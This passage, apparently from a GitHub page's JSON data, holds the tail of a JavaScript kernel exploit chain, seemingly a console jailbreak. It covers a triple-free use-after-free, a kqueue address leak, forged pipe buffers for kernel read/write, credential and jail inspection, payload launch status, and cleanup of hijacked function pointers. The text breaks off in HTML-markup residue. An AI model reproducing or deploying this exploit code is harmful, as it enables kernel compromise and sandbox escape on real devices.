                          // --- the 4 karw pipe files, and the forged pipebuf ---","                            // fd 15 reads f_count 2 BEFORE we touch it on every","                            // run while its siblings read 1. Nobody has explained","                            // that. This prints the final state of all four.","                            const pf = [];","                            for (const fd of [masterPipe[0], masterPipe[1],","                                              slavePipe[0], slavePipe[1]]) {","                                const fp = fget(fd);","                                pf.push(fd + \":\" + (kq(fp) ? \"fc=\" + rd32(fp.add32(0x28))","                                                           : \"nofp\"));","                            }","                            mark(\"DUMP-PIPE-FCOUNT\", pf.join(\" \"));","","                            for (const [nm, fd] of [[\"master\", masterPipe[0]],","                                                    [\"slave\", slavePipe[0]]]) {","                                const fp = fget(fd);","                                const fdata = rd8(fp);","                                if (!kq(fdata)) { mark(\"DUMP-PIPEBUF\", nm + \" nofdata\"); continue; }","                                dmpU8.fill(0);","                                const okr = kv.kread(dmpAddr, fdata, 0x18) === 0x18;","                                mark(\"DUMP-PIPEBUF\", nm + \" @\" + fdata","                                    + (okr ? \"  cnt=\" + dmpDv.getUint32(0, true)","                                        + \" in=\" + dmpDv.getUint32(4, true)","                                        + \" out=\" + dmpDv.getUint32(8, true)","                                        + \" size=0x\" + dmpDv.getUint32(0xc, true).toString(16)","                                        + \" buffer=\" + new int64(dmpDv.getUint32(0x10, true),","                                                                 dmpDv.getUint32(0x14, true))","                                        : \"  READ-FAILED\"));","                            }","","                            // --- the triplets' outputopts, re-read after close ---","                            // Confirms the repair actually persisted rather than","                            // being undone by the socket teardown.","                            const to = [];","                            for (const e of dumpOpts) {","                                const r = rd8(e.opts.add32(0x68));","                                const pi = rd8(e.opts.add32(0x10));","                                to.push(\"fd\" + e.fd + \"@\" + e.opts","                                    + \" rthdr=\" + (r || \"?\")","                                    + \" pktinfo=\" + (pi || \"?\"));","                            }","                            mark(\"DUMP-TRIPLET-OPTS\", to.length ? to.join(\"  \") : \"none\");","","                            // --- the triple-freed struct file ---","                            const uf = (typeof uafFpSaved !== \"undefined\") ? uafFpSaved : null;","                            if (kq(uf)) {","                                mark(\"DUMP-UAF-FILE\", \"fp=\" + uf","                                    + \" f_count=\" + rd32(uf.add32(0x28))","                                    + \" f_data=\" + (rd8(uf) || \"?\"));","                            }","","                            // --- ANY fd-table slot still pointing at it ---","                            if (kq(uf) \u0026\u0026 kq(fdtOfiles)) {","                                let hits = 0, lastFd = -1;","                                const wl = uf.low \u003e\u003e\u003e 0, wh = uf.hi \u003e\u003e\u003e 0;","                                const nfd = Math.min(0x400, (typeof SCAN_MAX !== \"undefined\")","                                    ? SCAN_MAX + 0x40 : 0x400);","                                for (let base = 0; base \u003c nfd; base += 0x80) {","                                    const n = Math.min(0x80, nfd - base);","                                    if (kv.kread(scanAddrDump,","                                        fdtOfiles.add32(base * FILEDESCENT_SIZE),","                                        n * FILEDESCENT_SIZE) !== n * FILEDESCENT_SIZE) break;","                                    for (let i = 0; i \u003c n; ++i) {","                                        const o = i * FILEDESCENT_SIZE;","                                        if (scanDvDump.getUint32(o, true) === wl","                                            \u0026\u0026 scanDvDump.getUint32(o + 4, true) === wh) {","                                            hits++; lastFd = base + i;","                                        }","                                    }","                                }","                                mark(\"DUMP-UAF-REFS\", \"slots_still_pointing_at_it=\" + hits","                                    + (hits ? \" last_fd=\" + lastFd : \"\")","                                    + \"  scanned=\" + nfd);","                            }","","                            // --- our own process ---","                            if (kq(curproc)) {","                                const uc = rd8(curproc.add32(0x40));","                                const pfd = rd8(curproc.add32(0x48));","                                mark(\"DUMP-PROC\", \"curproc=\" + curproc","                                    + \" ucred=\" + (uc || \"?\")","                                    + (kq(uc) ? \" cr_ref=\" + rd32(uc.add32(0x00))","                                        + \" uid=\" + rd32(uc.add32(0x04))","                                        + \" prison=\" + (rd8(uc.add32(0x30)) || \"?\") : \"\")","                                    + \" p_fd=\" + (pfd || \"?\"));","                                if (kq(pfd))","                                    mark(\"DUMP-FILEDESC\", \"fd_cdir=\" + (rd8(pfd.add32(0x10)) || \"?\")","                                        + \" fd_rdir=\" + (rd8(pfd.add32(0x18)) || \"?\")","                                        + \" fd_jdir=\" + (rd8(pfd.add32(0x20)) || \"?\"));","                            }","","                            mark(\"DUMP-DONE\", \"read-only, no kernel writes\");","                        } catch (e) {","                            mark(\"DUMP-THREW\", (e \u0026\u0026 e.message) ? e.message : String(e));","                        }","                    }","                    // ================ END END-OF-RUN STATE DUMP ================","","                    mark(\"STEP10-CHAIN\", \"kv=up jailbroken=\" + jailbroken","                        + \" kpatched=\" + kpatched + \" payload=\" + payloadRunning","                        + \" cleanup=\" + (rebootRequired ? \"incomplete\" : \"complete\"));","                    allDone = payloadRunning \u0026\u0026 !rebootRequired;","                }","            }","        }","","        mark(\"STEP10-SUMMARY\", \"committed=\" + committed","            + \" reboot=\" + rebootRequired","            + \" triplets=\" + (triplets ? triplets.join(\",\") : \"none\")","            + \" kernel_base=\" + (kernelBase || \"none\")","            + \" kq_fdp=\" + (kqFdp || \"none\")","            + \" kv=\" + (kv ? \"up\" : \"down\"));","","        if (!kv) {","            const stage = !committed ? \"not-armed\"","                : !triplets ? \"triple-free\"","                : !kernelBase ? \"leak-kqueue\"","                : \"make-karw\";","            mark(\"FAILED-STAGE\", \"stage=\" + stage","                + \" reached=\" + (triplets ? \"triplets\" : committed ? \"commit\" : \"none\"));","        }","","        state(allDone ? \"ALL DONE\"","              : kv ? \"KERNEL R/W -- REBOOT NEEDED\"","              : kernelBase ? \"FAILED IN make_karw -- REBOOT\"","              : triplets ? \"FAILED IN leak_kqueue (triple free was OK) -- REBOOT\"","              : committed ? \"FAILED IN triple free -- REBOOT\"","              : \"no commit\", allDone ? \"ok\" : kv ? \"warn\" : \"bad\");","\t\t\t  ","\t\tif (!payloadRunning) {","            hostFail();","        }","    } catch (e) {","        mark(\"STEP10-FAILED\", (e \u0026\u0026 e.message) ? e.message : String(e));","        state(\"FAILED -- see log\", \"bad\");","        hostFail();","    } finally {","","        if (uafSock) mark(\"UAF-SOCK-LEFT-OPEN\", \"fd=\" + uafSock);","","        try {","            if (restoreCtx) await restoreCtx.restore(\"finally\");","        } catch (e) { mark(\"THREAD-ATTRS-RESTORE-THREW\", e.message); }","        for (const w of workers) {","            try { if (w.armed) { await w.rpc(\"disarm\", 5000); w.armed = false; } }","            catch (e) { mark(\"DISARM-THREW\", w.name + \" \" + e.message); }","        }","        for (const w of workers) {","            try {","                if (w.wired \u0026\u0026 w.master \u0026\u0026 w.origVector \u0026\u0026 p) {","                    p.write8(w.master.add32(0x10), w.origVector);","                    w.wired = false;","                }","            } catch (e) { }","        }","        for (const w of workers) { try { w.worker.terminate(); } catch (e) { } }","        try {","            if (mainArmed \u0026\u0026 mainMf \u0026\u0026 mainOrig \u0026\u0026 p) {","                p.write8(mainMf, mainOrig);","                mainArmed = false;","                mark(\"EXPM1-RESTORED\", \"expm1(1)=\" + Math.expm1(1));","            }","        } catch (e) { mark(\"DISARM-THREW\", e.message); }","","        if (rebootRequired)","            mark(\"REBOOT-REQUIRED\", \"reason=uaf-file-not-reclaimed\");","    }","})();"],"stylingDirectives":null,"colorizedLines":["\u003cspan class=pl-c\u003e// ?v=10 must match mem.js\u0026#39;s specifier EXACTLY or core.js builds a second\u003c/span\u003e","\u003cspan class=pl-c\u003e// module record and releaseFakeCell() (only call site: mem.js:662) reaches a\u003c/span\u003e","\u003cspan class=pl-c